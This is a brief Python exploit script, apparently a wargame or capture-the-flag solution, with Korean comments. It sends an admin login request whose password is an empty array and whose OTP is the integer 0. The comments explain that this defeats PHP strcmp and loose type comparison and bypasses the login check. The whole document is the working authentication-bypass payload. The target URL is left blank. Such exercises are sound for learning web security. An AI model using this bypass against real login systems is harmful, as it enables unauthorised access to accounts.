import requests
import json
import base64

url = ''
payload = {
    "id": "admin",
    "pw": [],
    "otp": 0
}
data = {'cred': base64.b64encode(json.dumps(payload).encode()).decode()}
res = requests.post(url, data=data)
print(res.text)


# if ($cred['otp'] != $GLOBALS['otp'])에서 $cred['otd']가 정수면 비교를 위해 $otp가 정수로 형변환 됨
# strcmp의 취약점을 이용한 문제, 배열이 입력되면 null을 반환
